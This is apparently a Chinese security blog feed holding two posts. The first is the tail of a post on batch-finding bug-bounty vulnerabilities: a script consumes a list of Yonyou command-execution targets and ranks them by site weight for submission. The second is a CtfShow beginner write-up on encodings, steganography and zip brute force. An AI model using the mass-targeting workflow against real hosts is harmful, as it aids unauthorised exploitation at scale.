class="string">&quot;用友命令执行列表.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">    url_len = len(open(<span class="string">&quot;用友命令执行列表.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>).readlines())</span><br><span class="line">    <span class="comment">#每次启动时清空两个txt文件</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&quot;反查失败列表.txt&quot;</span>):</span><br><span class="line">        f = open(<span class="string">&quot;反查失败列表.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        f.truncate()</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&quot;ip反查结果.txt&quot;</span>):</span><br><span class="line">        f = open(<span class="string">&quot;ip反查结果.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        f.truncate()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(url_list):</span><br><span class="line">        catch_result(i)</span><br></pre></td></tr></table></figure>
<p>运行结果：<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/8.png" alt=""></p>
<p>然后拿到解析的域名后，就是对域名权重进行检测，这里采用爱站来进行权重检测，继续写一个批量检测脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/6/2 23:39</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> HTTPError</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> tldextract</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">ssl._create_default_https_context = ssl._create_stdlib_context</span><br><span class="line"></span><br><span class="line">bd_mb = []</span><br><span class="line">gg = []</span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#数据清洗</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    url_list = open(<span class="string">&quot;ip反查结果.txt&quot;</span>).readlines()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;domain.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line">            i = i.strip()</span><br><span class="line">            res = i.split(<span class="string">&#x27;[ip138]:&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;[aizhan]&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&quot;,&quot;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">            <span class="keyword">if</span> res == <span class="string">&#x27;None&#x27;</span> <span class="keyword">or</span> res == <span class="string">&#x27;[]&#x27;</span>:</span><br><span class="line">                res = i.split(<span class="string">&#x27;[aizhan]:&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&quot;,&quot;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">            <span class="keyword">if</span> res != <span class="string">&#x27;[]&#x27;</span>:</span><br><span class="line">                res = re.sub(<span class="string">&#x27;[\&#x27;\[\]]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, res)</span><br><span class="line">                ext = tldextract.extract(res)</span><br><span class="line">                res1 = i.split(<span class="string">&#x27;[url]:&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;[ip138]&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">                res2 = <span class="string">&quot;http://www.&quot;</span> + <span class="string">&#x27;.&#x27;</span>.join(ext[<span class="number">1</span>:])</span><br><span class="line">                result = <span class="string">&#x27;[url]:&#x27;</span> + res1 + <span class="string">&#x27;\t&#x27;</span> + <span class="string">&#x27;[domain]:&#x27;</span> + res2</span><br><span class="line">                f.write(result + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPc</span>(<span class="params">domain</span>):</span></span><br><span class="line">    ua_header = UserAgent()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;baidurank.aizhan.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: ua_header.random,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;document&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    aizhan_pc = <span class="string">&#x27;https://baidurank.aizhan.com/api/br?domain=&#123;&#125;&amp;style=text&#x27;</span>.format(domain)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req = urllib.request.Request(aizhan_pc, headers=headers)</span><br><span class="line">        response = urllib.request.urlopen(req,timeout=<span class="number">10</span>)</span><br><span class="line">        b = response.read()</span><br><span class="line">        a = b.decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">        result_pc = re.findall(re.compile(<span class="string">r&#x27;&gt;(.*?)&lt;/a&gt;&#x27;</span>),a)</span><br><span class="line">        pc = result_pc[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> HTTPError <span class="keyword">as</span> u:</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> getPc(domain)</span><br><span class="line">    <span class="keyword">return</span> pc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMobile</span>(<span class="params">domain</span>):</span></span><br><span class="line">    ua_header = UserAgent()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;baidurank.aizhan.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: ua_header.random,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;document&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    aizhan_pc = <span class="string">&#x27;https://baidurank.aizhan.com/api/mbr?domain=&#123;&#125;&amp;style=text&#x27;</span>.format(domain)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req = urllib.request.Request(aizhan_pc, headers=headers)</span><br><span class="line">        response = urllib.request.urlopen(req,timeout=<span class="number">10</span>)</span><br><span class="line">        b = response.read()</span><br><span class="line">        a = b.decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">        result_m = re.findall(re.compile(<span class="string">r&#x27;&gt;(.*?)&lt;/a&gt;&#x27;</span>),a)</span><br><span class="line">        mobile = result_m[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span> HTTPError <span class="keyword">as</span> u:</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> getMobile(domain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mobile</span><br><span class="line"><span class="comment"># 权重查询</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">seo</span>(<span class="params">domain, url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result_pc = getPc(domain)</span><br><span class="line">        result_mobile = getMobile(domain)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> u:</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&#x27;[!] 目标&#123;&#125;检测失败，已写入fail.txt等待重新检测&#x27;</span>.format(url))</span><br><span class="line">            print(domain)</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">&#x27;fail.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> o:</span><br><span class="line">                o.write(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[!!]目标&#123;&#125;第二次检测失败&#x27;</span>.format(url))</span><br><span class="line">    result = <span class="string">&#x27;[+] 百度权重:&#x27;</span>+ result_pc +<span class="string">&#x27;  移动权重:&#x27;</span>+ result_mobile +<span class="string">&#x27;  &#x27;</span>+url</span><br><span class="line">    print(result)</span><br><span class="line">    <span class="keyword">if</span> result_pc ==<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> result_mobile ==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        gg.append(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bd_mb.append(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main_domain = url.split(<span class="string">&#x27;[domain]:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        ext = tldextract.extract(main_domain)</span><br><span class="line">        domain = <span class="string">&#x27;.&#x27;</span>.join(ext[<span class="number">1</span>:])</span><br><span class="line">        rew = seo(domain, url)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> u:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multithreading</span>(<span class="params">funcname, params=[], filename=<span class="string">&quot;domain.txt&quot;</span>, pools=<span class="number">15</span></span>):</span></span><br><span class="line">    works = []</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">            func_params = [i.rstrip(<span class="string">&quot;\n&quot;</span>)] + params</span><br><span class="line">            works.append((func_params, <span class="literal">None</span>))</span><br><span class="line">    pool = threadpool.ThreadPool(pools)</span><br><span class="line">    reqs = threadpool.makeRequests(funcname, works)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> reqs]</span><br><span class="line">    pool.wait()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">google_simple</span>(<span class="params">url, j</span>):</span></span><br><span class="line">    google_pc = <span class="string">&quot;https://pr.aizhan.com/&#123;&#125;/&quot;</span>.format(url)</span><br><span class="line">    bz = <span class="number">0</span></span><br><span class="line">    http_or_find = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(google_pc, timeout=<span class="number">10</span>).text</span><br><span class="line">        http_or_find = <span class="number">1</span></span><br><span class="line">        result_pc = re.findall(re.compile(<span class="string">r&#x27;&lt;span&gt;谷歌PR：&lt;/span&gt;&lt;a&gt;(.*?)/&gt;&lt;/a&gt;&#x27;</span>), response)[<span class="number">0</span>]</span><br><span class="line">        result_num = result_pc.split(<span class="string">&#x27;alt=&quot;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">        <span class="keyword">if</span> int(result_num) &gt; <span class="number">0</span>:</span><br><span class="line">            bz = <span class="number">1</span></span><br><span class="line">        result = <span class="string">&#x27;[+] 谷歌权重:&#x27;</span> + result_num + <span class="string">&#x27;  &#x27;</span> + j</span><br><span class="line">        <span class="keyword">return</span> result, bz</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span>(http_or_find !=<span class="number">0</span>):</span><br><span class="line">            result = <span class="string">&quot;[!]格式错误:&quot;</span> + <span class="string">&quot;j&quot;</span></span><br><span class="line">            <span class="keyword">return</span> result, bz</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> google_simple(url, j)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_function</span>():</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&quot;fail.txt&quot;</span>):</span><br><span class="line">        f = open(<span class="string">&quot;fail.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        f.truncate()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = open(<span class="string">&quot;fail.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    multithreading(exp, [], <span class="string">&quot;domain.txt&quot;</span>, <span class="number">15</span>)</span><br><span class="line">    fail_url_list = open(<span class="string">&quot;fail.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">    <span class="keyword">if</span> len(fail_url_list) &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&quot;*&quot;</span>*<span class="number">12</span> + <span class="string">&quot;正在开始重新检测失败的url&quot;</span> + <span class="string">&quot;*&quot;</span>*<span class="number">12</span>)</span><br><span class="line">        <span class="keyword">global</span> flag</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        multithreading(exp, [], <span class="string">&quot;fail.txt&quot;</span>, <span class="number">15</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;权重列表.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> bd_mb:</span><br><span class="line">            f.write(i + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;-&quot;</span>*<span class="number">25</span> + <span class="string">&quot;开始检测谷歌的权重&quot;</span> + <span class="string">&quot;-&quot;</span>*<span class="number">25</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;*&quot;</span> * <span class="number">12</span> + <span class="string">&quot;正在开始检测谷歌的权重&quot;</span> + <span class="string">&quot;*&quot;</span> * <span class="number">12</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> gg:</span><br><span class="line">            main_domain = j.split(<span class="string">&#x27;[domain]:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            ext = tldextract.extract(main_domain)</span><br><span class="line">            domain = <span class="string">&quot;www.&quot;</span> + <span class="string">&#x27;.&#x27;</span>.join(ext[<span class="number">1</span>:])</span><br><span class="line">            google_result, bz = google_simple(domain, j)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            print(google_result)</span><br><span class="line">            <span class="keyword">if</span> bz == <span class="number">1</span>:</span><br><span class="line">                f.write(google_result + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;检测完成，已保存txt在当前目录下&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    get_data()</span><br><span class="line">    exec_function()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/9.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/10.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/11.png" alt=""></p>
<h2 id="漏洞提交"><a class="header-anchor" href="#漏洞提交">¶</a>漏洞提交</h2>
<p>最后就是一个个拿去提交漏洞了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/12.png" alt=""></p>
<h2 id="结尾"><a class="header-anchor" href="#结尾">¶</a>结尾</h2>
<p>文中所写脚本还处于勉强能用的状态，后续会进行优化更改。师傅们如有需要也可选择自行更改。</p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>CtfShow萌新区WP</title>
    <url>/posts/25127/</url>
    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>对，我就是萌新，哭哭。<br>
萌新系列需要萌新码开启，按照第一题提示加群即可获得，不过有些题有时候显示不出来，所以我记录的话会断断续续的<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/DDB74BA5D9F54D97E757A1B862D52268.gif" width = "200" height = "200" style="float: left;"/></p>
<h2 id="Crypto"><a class="header-anchor" href="#Crypto">¶</a>Crypto</h2>
<h3 id="密码1"><a class="header-anchor" href="#密码1">¶</a>密码1</h3>
<p>给出了一串16进制的数据，我们先转换成str<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%811/_FDUR7%7B_ZR%7BCBF%28LSX9%5D69S.png" alt=""><br>
得到一串base64编码的数据，我们再去解一下base64<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%811/J%25OCNJY%40%29BW%7D%5DBVU%29Q_P8PS.png" alt=""><br>
解码后得到一串栅栏密码，再去解一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%811/%28Y5DCLQXOI%24%29MQ7DLZA36%288.png" alt=""><br>
在栏数为19的时候得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KEY&#123;dffb06a33eeeb0d259c84bd8cf146d08-&#125;</span><br></pre></td></tr></table></figure>
<h3 id="密码2"><a class="header-anchor" href="#密码2">¶</a>密码2</h3>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%812/IO2LW3_4X%24VPD56%25%5D422DWS.png" alt=""><br>
我们去看一下键盘，发现被rdcvbg 2qase3 6tghu7分别包围的键是f、w和y<br>
于是按照格式得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KEY&#123;fwy&#125;</span><br></pre></td></tr></table></figure>
<h3 id="密码3"><a class="header-anchor" href="#密码3">¶</a>密码3</h3>
<p>题目给出一段字符，看起来是莫斯密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -- -- -.. -.. -- -.. -- -.. -- -- -- -.. -.. -.. &#x2F;-- -.. -- -.. -.. --&#x2F; -- -- -- -- -- &#x2F;-- -.. -.. -- -.. -- &#x2F;-- -.. -.. -- </span><br></pre></td></tr></table></figure>
<p>解密后得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MORSEnullISnullCOOLnullBUTnullBACONnullISnullCOOLERnullMMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM</span><br></pre></td></tr></table></figure>
<p>结合题目提示培根，只处理尾部M和D，将M转换成A，D转换成B</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AABBABABAAABBBABABBAAAAAAABBABAABBA</span><br></pre></td></tr></table></figure>
<p>再进行培根密码解密<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%813/2719%7B%7D%24~3%5BWB_M%28I%291N%5DNL2.png" alt=""></p>
<h3 id="密码4"><a class="header-anchor" href="#密码4">¶</a>密码4</h3>
<p>给出一串base64编码，去解码一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%814/Z0_%7D%28ACQDPSWIDCT%7B7ZN%24_F.png" alt=""><br>
再次base家族base85解密<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%814/04JMGQ%293%28%60W39UZ%24PK~F%5DUT.png" alt=""><br>
得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;base_base_base&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Misc"><a class="header-anchor" href="#Misc">¶</a>Misc</h2>
<h3 id="隐写1"><a class="header-anchor" href="#隐写1">¶</a>隐写1</h3>
<p>下载下来的png文件打不开，提示错误，放进010进去查看<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E9%9A%90%E5%86%991/J_%28%5BAFO4S%5B3K%40C%29S03_%5DY1J.png" alt=""><br>
发现文件头错误，png文件头应该是89504E47，将99改成89，再保存打开文件，得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E9%9A%90%E5%86%991/%60H%5D8C_3VB0IV%7D%25_UF7UEB%5B6.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;zhe_ci_meiyou_ctfshow&#125;</span><br></pre></td></tr></table></figure>
<h3 id="隐写2"><a class="header-anchor" href="#隐写2">¶</a>隐写2</h3>
<p>下载下来得到一张jpg图片，图片提示jphs隐写，用Jphswin工具打开<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%992/9%606%7BK5P%5DIM%60X5%60%29K%5B6YXU%29V.png" alt=""><br>
点击seek解密，密码没有，就空着不写，然后另存为txt文本，得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;202cb962ac59075b964b07152d234b70&#125;</span><br></pre></td></tr></table></figure>
<h3 id="萌新-隐写2"><a class="header-anchor" href="#萌新-隐写2">¶</a>萌新_隐写2</h3>
<p>下载文件得到一个加密的zip压缩包<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%992/E%296IXVG444M%24KA5B1%25%29_1XN.png" alt=""><br>
提示我们是密码是生日，所以最长有8位数字，直接压缩包爆破<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%992/KY4P%25ODWTF1NV%7B1HAWHF%7DU3.png" alt=""><br>
得到压缩包密码为：19981000<br>
打开压缩包后得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;brute_force&#125;</span><br></pre></td></tr></table></figure>
<h3 id="萌新隐写3"><a class="header-anchor" href="#萌新隐写3">¶</a>萌新隐写3</h3>
<p>这题直接打开图片地址，就有flag，emmm<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%993/B9XXQPT35%7BX4%40%7BFNUL8BA6Y.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;xinti_gkd&#125;</span><br></pre></td></tr></table></figure>
<h3 id="萌新隐写4"><a class="header-anchor" href="#萌新隐写4">¶</a>萌新隐写4</h3>
<p>下载的是一个doc文档<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%994/QQ%E6%88%AA%E5%9B%BE20210115224404.png" alt=""><br>
这里光标停在下边多一行，猜测可能有文字被隐藏了，所以我们去选项打开显示一下隐藏文字<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%994/DRO%7DID7PMHA8X%285P%24X%7D%254%5B6.png" alt=""><br>
得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%994/7G8X7YG1%601~MKYZZO2F%40%282J.png" alt=""><br>
当然还有一种办法，就是crtl+a全选复制到外面(隐藏的文字一起被选中)，就可以看到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;word_stega&#125;</span><br></pre></td></tr></table></figure>
<h3 id="萌新隐写5"><a class="header-anchor" href="#萌新隐写5">¶</a>萌新隐写5</h3>
<p>打开，给了我们一段unicode编码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%995/ZT%5BEJQ%60WI%7B4%5D%28%7D%5D0E1UR7Y7.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">䴀娀圀䜀䌀娀娀䤀一䈀儀圀㘀堀㌀䬀一䘀㈀嘀㘀夀吀嘀䰀㔀㐀圀㘀㌀吀䠀䰀㔀刀䐀䜀䴀匀㜀䘀䔀㴀㴀㴀㴀㴀㴀</span><br></pre></td></tr></table></figure>
<p>从中文转换后得到<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%995/UZKYZ3%40%25D%5BYE0PUTIRA%24%24%40T.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\u4d00\u5a00\u5700\u4700\u4300\u5a00\u5a00\u4900\u4e00\u4200\u5100\u5700\u3600\u5800\u3300\u4b00\u4e00\u4600\u3200\u5600\u3600\u5900\u5400\u5600\u4c00\u3500\u3400\u5700\u3600\u3300\u5400\u4800\u4c00\u3500\u5200\u4400\u4700\u4d00\u5300\u3700\u4600\u4500\u3d00\u3d00\u3d00\u3d00\u3d00\u3d00</span><br></pre></td></tr></table></figure>
<p>再16进制转化成字符<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%995/%60351NNWFW91L4F272ZLX229.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MZWGCZZINBQW6X3KNF2V6YTVL54W63THL5RDGMS7FE&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>base32解密得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%995/23ZKJ5~_DQAM%40E0%29%5BOC3%24LE.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag(hao_jiu_bu_yong_b32_)</span><br></pre></td></tr></table></figure>
<h3 id="萌新隐写6"><a class="header-anchor" href="#萌新隐写6">¶</a>萌新隐写6</h3>
<p>下载下来是一个音频文件，拖进音频分析软件里<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%996/%25OX%7D_%7DD_%252AZA%7DOH3V0P%25F0.png" alt=""><br>
看到一段有规律的波形，应该是莫斯密码，长的替换成-，短的替换成.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- ..- --.. .. -.- .. ... --. ----- ----- -..</span><br></pre></td></tr></table></figure>
<p>莫斯密码解密得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%996/%7DZ%5D%40_5%24_FYQ1CQ_FY%5BVY%7D%290.png" alt=""></p>
